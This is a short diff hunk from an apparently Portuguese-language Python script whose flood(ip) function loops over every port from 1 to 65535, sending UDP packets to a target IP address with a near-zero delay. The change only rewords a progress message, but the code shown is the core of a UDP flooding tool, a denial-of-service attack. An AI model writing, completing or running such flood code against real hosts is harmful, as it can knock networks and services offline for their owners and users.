@@ -52,7 +52,7 @@ def flood(ip):
         for i in range(1,65536):
             porta = i
             sock.sendto(pacote,(ip, porta))
-            print(f"Foram enviados {contador} pacotes para o IP {ip} na porta {porta}")
+            print(f"Pacote {contador} | Destino: {ip} | Porta: {porta}")
             contador = contador + 1
             time.sleep(0.0001) #1/10000 segundos
 
